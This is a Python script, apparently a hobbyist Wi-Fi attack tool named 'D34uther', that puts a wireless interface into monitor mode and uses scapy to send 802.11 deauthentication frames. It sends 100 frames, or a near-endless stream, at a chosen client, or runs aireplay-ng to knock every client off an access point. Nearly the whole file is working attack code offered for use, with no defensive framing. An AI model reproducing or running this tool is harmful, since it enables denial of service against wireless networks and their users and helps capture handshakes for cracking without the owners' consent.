import subprocess
from colorama import Fore, Back, Style
from scapy.all import *

# Banner

print(Fore.LIGHTYELLOW_EX + """
██████╗ ██████╗ ██╗  ██╗██╗   ██╗████████╗██╗  ██╗███████╗██████╗ 
██╔══██╗╚════██╗██║  ██║██║   ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗
██║  ██║ █████╔╝███████║██║   ██║   ██║   ███████║█████╗  ██████╔╝
██║  ██║ ╚═══██╗╚════██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
██████╔╝██████╔╝     ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║
╚═════╝ ╚═════╝      ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                  
Maded by Fr0z3n

Version:0.7

""")
print(Fore.LIGHTRED_EX)

# Gerekli bilgileri alıyoruz

bssid=str(input("BSSID:"))

target=str(input("Target's MAC (for specific target):"))

interface=str(input("Interface:"))
print("Target:"+target)
print("BSSID: "+bssid)
print("İnterface: "+interface)

# Monitör moda geçiyoruz

subprocess.call(["systemctl", "stop", "NetworkManager.service"])
subprocess.call(["ifconfig", interface, "down"])
subprocess.call(["iwconfig", interface, "mode", "monitor"])
subprocess.call(["ifconfig", interface, "up"])

subprocess.call(["clear"])

# Banner

print(Fore.LIGHTYELLOW_EX)
print("""
██████╗ ██████╗ ██╗  ██╗██╗   ██╗████████╗██╗  ██╗███████╗██████╗ 
██╔══██╗╚════██╗██║  ██║██║   ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗
██║  ██║ █████╔╝███████║██║   ██║   ██║   ███████║█████╗  ██████╔╝
██║  ██║ ╚═══██╗╚════██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
██████╔╝██████╔╝     ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║
╚═════╝ ╚═════╝      ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                  
Maded by Fr0z3n

Version:0.7

""")

print(Fore.LIGHTBLUE_EX)
print(Back.RED)

# İşlemimizi seçiyoruz

print("""

1)for Handshake                                                
2)for Deauthentication (single target)                         
3)for Deauthentication (network)(you need aireplay-ng for this)
99)Exit                                                        
for Stop CTRL+C                                                """ + Style.RESET_ALL)

print(Fore.LIGHTBLUE_EX)


choose=int(input("Choose: "))
print(Fore.LIGHTYELLOW_EX)
if choose==1:
  dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
  packet = RadioTap()/dot11/Dot11Deauth(reason=7)
  sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)
  subprocess.call(["systemctl", "start", "NetworkManager.service"])
  subprocess.call(["ifconfig", interface, "down"])
  subprocess.call(["iwconfig", interface, "mode", "managed"])
  subprocess.call(["ifconfig", interface, "up"])
  print("Thanks for Using D34uther")
  exit
if choose==2:
  dot11 = Dot11(addr1=target, addr2=bssid, addr3=bssid)
  packet = RadioTap()/dot11/Dot11Deauth(reason=7)
  sendp(packet, inter=0.1, count=99999999999, iface=interface, verbose=1)
  subprocess.call(["systemctl", "start", "NetworkManager.service"])
  subprocess.call(["ifconfig", interface, "down"])
  subprocess.call(["iwconfig", interface, "mode", "managed"])
  subprocess.call(["ifconfig", interface, "up"])
  print("Thanks for Using D34uther")
  exit
if choose==3:
  subprocess.call(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])
  subprocess.call(["systemctl", "start", "NetworkManager.service"])
  subprocess.call(["ifconfig", interface, "down"])
  subprocess.call(["iwconfig", interface, "mode", "managed"])
  subprocess.call(["ifconfig", interface, "up"])
  print("Thanks for Using D34uther")
  exit
if choose==99:
  subprocess.call(["systemctl", "start", "NetworkManager.service"])
  subprocess.call(["ifconfig", interface, "down"])
  subprocess.call(["iwconfig", interface, "mode", "managed"])
  subprocess.call(["ifconfig", interface, "up"])
  exit
else:
  subprocess.call(["systemctl", "start", "NetworkManager.service"])
  subprocess.call(["ifconfig", interface, "down"])
  subprocess.call(["iwconfig", interface, "mode", "managed"])
  subprocess.call(["ifconfig", interface, "up"])
  print("Thanks for Using D34uther")
  exit

print(Style.RESET_ALL)

input("Press Enter to Exit")
